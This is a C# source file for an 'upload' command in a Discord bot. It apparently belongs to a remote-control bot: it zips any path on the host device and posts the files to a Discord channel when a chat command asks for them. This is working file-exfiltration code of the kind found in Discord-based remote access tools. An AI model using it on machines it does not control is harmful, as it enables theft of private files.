using Discord;
using Discord.Commands;
using System.IO.Compression;

namespace Main.Source.Bot.Commands
{
    public class Upload : CommandBase
    {
        public override string Name => "upload";
        public override string Info => "Uploads files from the deivce to the server";
        public override string Use => "Path (wrap in double quotes)";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length < 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = string.Join(" ", args);

            string path = Utilities.Parser.FromQuotes(arguments);

            if (!Path.Exists(path))
            {
                await socket.Message.ReplyAsync($"Path `{path}` does not exist.");
                return;
            }

            if (Directory.Exists(path))
            {
                string zipped = Path.Join(Path.GetTempPath(), Path.GetFileName(path) + ".zip");
                ZipFile.CreateFromDirectory(path, zipped);

                path = zipped;
            }

            var info = new FileInfo(path);
            if (info.Length > 8000000)
            {
                await socket.Message.ReplyAsync($"File `{path}` is too large by {info.Length - 8000000} bytes.");
                return;
            }

            using (var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                await socket.Channel.SendFileAsync(
                    stream: stream,
                    filename: Path.GetFileName(path),
                    text: $"`{path}`",
                    messageReference: new MessageReference(socket.Message.Id)
                );
            }
        }
    }
}
